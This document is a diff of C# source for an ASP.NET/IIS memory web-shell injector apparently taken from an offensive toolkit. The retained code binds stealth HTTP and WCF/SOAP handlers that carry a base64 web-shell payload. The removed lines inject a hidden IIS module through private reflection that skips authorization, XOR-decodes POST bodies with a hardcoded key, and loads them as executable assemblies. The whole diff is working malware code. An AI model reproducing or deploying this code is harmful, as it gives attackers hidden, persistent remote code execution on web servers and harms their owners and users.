@@ -60,6 +60,7 @@ public class payload
                     szUrlPattern = "/" + szUrlPattern;
 
                 byte[] rawHandlerCodeBytes = Convert.FromBase64String(szWebShellBase64);
+                
                 MyStealthHandler handlerInstance = new MyStealthHandler(rawHandlerCodeBytes);
                 
                 lock (currentContext.Application)
@@ -71,43 +72,7 @@ public class payload
                 HostingEnvironment.RegisterVirtualPathProvider(shadowProvider);
                 fnGlobalClearCache();
 
-                return $"[+] SUCCESS: IIS HttpHandler dynamically bound and shadows-linked at [{szUrlPattern}]!";
-            }
-            else if (shellType.Equals("iis_module", StringComparison.OrdinalIgnoreCase))
-            {
-                if (string.IsNullOrEmpty(szUrlPattern))
-                    szUrlPattern = "/core_init";
-                if (!szUrlPattern.StartsWith("/"))
-                    szUrlPattern = "/" + szUrlPattern;
-
-                try
-                {
-                    HttpApplication app = currentContext.ApplicationInstance;
-
-                    MyStealthModule stealthModule = new MyStealthModule();
-                    stealthModule.Init(app);
-
-                    FieldInfo runtimeModulesField = typeof(HttpApplication).GetField("_runtimeModules", BindingFlags.NonPublic | BindingFlags.Instance);
-                    if (runtimeModulesField != null)
-                    {
-                        object runtimeModules = runtimeModulesField.GetValue(app);
-                        if (runtimeModules != null)
-                        {
-                            MethodInfo addMethod = runtimeModules.GetType().GetMethod("AddModule", BindingFlags.NonPublic | BindingFlags.Instance);
-                            if (addMethod != null)
-                            {
-                                addMethod.Invoke(runtimeModules, new object[] { "DynamicStealthModule", stealthModule });
-                            }
-                        }
-                    }
-
-                    currentContext.Application["stealth_matrix_route"] = szUrlPattern;
-                    return $"[+] SUCCESS: IIS Dynamic Module injected via Runtime Reflection! Route: [{szUrlPattern}]";
-                }
-                catch (Exception ex)
-                {
-                    return $"[-] INJECTION_FAILED: {ex.Message}";
-                }
+                return $"[+] SUCCESS: IIS HttpHandler directly bound with WebShell payload at [{szUrlPattern}]!";
             }
             else if (shellType.Equals("wcf_soap", StringComparison.OrdinalIgnoreCase))
             {
@@ -117,7 +82,6 @@ public class payload
                     szUrlPattern = "/" + szUrlPattern;
 
                 byte[] rawSoapCodeBytes = Convert.FromBase64String(szWebShellBase64);
-
                 MyStealthSoapHandler soapHandlerInstance = new MyStealthSoapHandler(rawSoapCodeBytes);
                 
                 lock (currentContext.Application)
@@ -129,7 +93,7 @@ public class payload
                 HostingEnvironment.RegisterVirtualPathProvider(shadowSoapProvider);
                 fnGlobalClearCache();
 
-                return $"[+] SUCCESS: WCF/SOAP Dynamic Endpoint successfully allocated and shadows-linked at [{szUrlPattern}]!";
+                return $"[+] SUCCESS: WCF/SOAP Dynamic Endpoint successfully allocated at [{szUrlPattern}]!";
             }
         }
         catch (Exception ex)
@@ -226,115 +190,27 @@ public class payload
 
         public void ProcessRequest(HttpContext ctx)
         {
-            if (ctx.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
+            try
             {
-                try
+                if (!ctx.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
                 {
-                    int totalBytes = ctx.Request.TotalBytes;
-                    if (totalBytes <= 4) return;
-                    byte[] rawData = ctx.Request.BinaryRead(totalBytes);
-
-                    if (ctx.Session["k"] == null) ctx.Session["k"] = "e376d904f308ca98";
-                    object loader = ctx.Session["nebulapulsar"];
-
-                    if (loader == null)
-                    {
-                        byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes((string)ctx.Session["k"]);
-                        for (int i = 0; i < rawData.Length; i++)
-                            rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);
-
-                        Assembly asm = Assembly.Load(rawData);
-                        loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
-                        ctx.Session["nebulapulsar"] = loader;
-                        ctx.Response.Write("LOADER_INIT_SUCCESS");
-                    }
-                    else
-                    {
-                        ctx.Items["rawPostData"] = rawData;
-                        loader.GetType().GetMethod("Equals", new Type[] { typeof(object) }).Invoke(loader, new object[] { ctx });
-                    }
+                    ctx.Response.StatusCode = 404;
+                    return;
                 }
-                catch (Exception ex)
+
+                if (_ashxRawBytes == null || _ashxRawBytes.Length == 0)
                 {
-                    ctx.Response.Write("DYNAMIC_ASHX_EXEC_FAULT: " + ex.Message);
+                    ctx.Response.StatusCode = 404;
+                    return;
                 }
+
+                ctx.Response.ContentType = "text/html";
+                ctx.Response.OutputStream.Write(_ashxRawBytes, 0, _ashxRawBytes.Length);
+                ctx.Response.Flush();
             }
-        }
-    }
-
-    public class MyStealthModule : IHttpModule
-    {
-        public void Dispose() { }
-        public void Init(HttpApplication app)
-        {
-            app.BeginRequest += new EventHandler(OnBeginRequest);
-        }
-
-        private void OnBeginRequest(object sender, EventArgs e)
-        {
-            HttpApplication app = (HttpApplication)sender;
-            HttpContext ctx = app.Context;
-
-            string activeRoute = ctx.Application["stealth_matrix_route"] as string;
-            if (string.IsNullOrEmpty(activeRoute))
-                return;
-
-            if (ctx.Request.RawUrl.ToLower().Contains(activeRoute.ToLower()) && ctx.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
+            catch (Exception ex)
             {
-                try
-                {
-                    ctx.Response.Clear();
-                    ctx.Response.StatusCode = 200;
-                    ctx.Response.StatusDescription = "OK";
-                    ctx.SkipAuthorization = true;
-
-                    int totalBytes = ctx.Request.TotalBytes;
-                    if (totalBytes <= 4) return;
-                    byte[] rawData = ctx.Request.BinaryRead(totalBytes);
-
-                    if (ctx.Session != null)
-                    {
-                        if (ctx.Session["k"] == null)
-                            ctx.Session["k"] = "e376d904f308ca98";
-                    }
-                    else
-                    {
-                        ctx.Application["k"] = "e376d904f308ca98";
-                    }
-
-                    object loader = ctx.Application["nebulapulsar_global_instance"];
-                    if (loader == null)
-                    {
-                        byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes("e376d904f308ca98");
-                        for (int i = 0; i < rawData.Length; i++)
-                            rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);
-
-                        Assembly asm = Assembly.Load(rawData);
-                        loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
-                        
-                        ctx.Application["nebulapulsar_global_instance"] = loader;
-                        
-                        ctx.Response.Write("LOADER_INIT_SUCCESS");
-                        ctx.Response.Flush();
-                        
-                        app.CompleteRequest(); 
-                        return;
-                    }
-                    else
-                    {
-                        ctx.Items["rawPostData"] = rawData;
-                        loader.GetType().GetMethod("Equals", new Type[]{ typeof(object) }).Invoke(loader, new object[]{ ctx });
-                        ctx.Response.Flush();
-                        app.CompleteRequest();
-                        return;
-                    }
-                }
-                catch (Exception ex)
-                {
-                    ctx.Response.Write("MODULE_PORT_ERROR: " + ex.Message);
-                    ctx.Response.Flush();
-                    app.CompleteRequest();
-                }
+                ctx.Response.Write("HANDLER_EXEC_FAULT: " + ex.Message);
             }
         }
     }
